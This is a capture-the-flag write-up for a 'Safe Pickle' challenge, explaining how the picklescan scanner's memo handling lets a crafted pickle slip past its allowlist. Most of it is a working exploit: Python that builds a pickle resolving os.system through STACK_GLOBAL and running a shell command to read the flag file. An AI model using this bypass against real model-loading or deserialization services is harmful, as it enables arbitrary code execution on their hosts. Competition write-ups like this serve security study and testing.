# Safe Pickle

* Round: 39 (2023/10)
* Category: Misc
* Points: 100
* Solves: 7

## Description

Safe pickle deserializing service powered by [picklescan](https://github.com/mmaitre314/picklescan)!

## Solution

The [way](https://github.com/mmaitre314/picklescan/blob/40001cd1caa9e041b1bce1b80f3707056cd8be52/src/picklescan/scanner.py#L193) picklescan handles memo doesn't look at the argument, so it is possible to have a different memo and use `STACK_GLOBAL` to bypass allowlist checking.

```python
import pickle, base64

pkl = b''.join([
    pickle.UNICODE + b'os\n',
    pickle.PUT + b'2\n',
    pickle.POP,
    pickle.UNICODE + b'system\n',
    pickle.PUT + b'3\n',
    pickle.POP,
    pickle.UNICODE + b'torch\n',
    pickle.PUT + b'0\n',
    pickle.POP,
    pickle.UNICODE + b'LongStorage\n',
    pickle.PUT + b'1\n',
    pickle.POP,

    pickle.GET + b'2\n',
    pickle.GET + b'3\n',
    pickle.STACK_GLOBAL,

    pickle.MARK,
    pickle.UNICODE + b'cat flag.txt\n',
    pickle.TUPLE,

    pickle.REDUCE
]) + b'.'
print(base64.b64encode(pkl).decode())
```
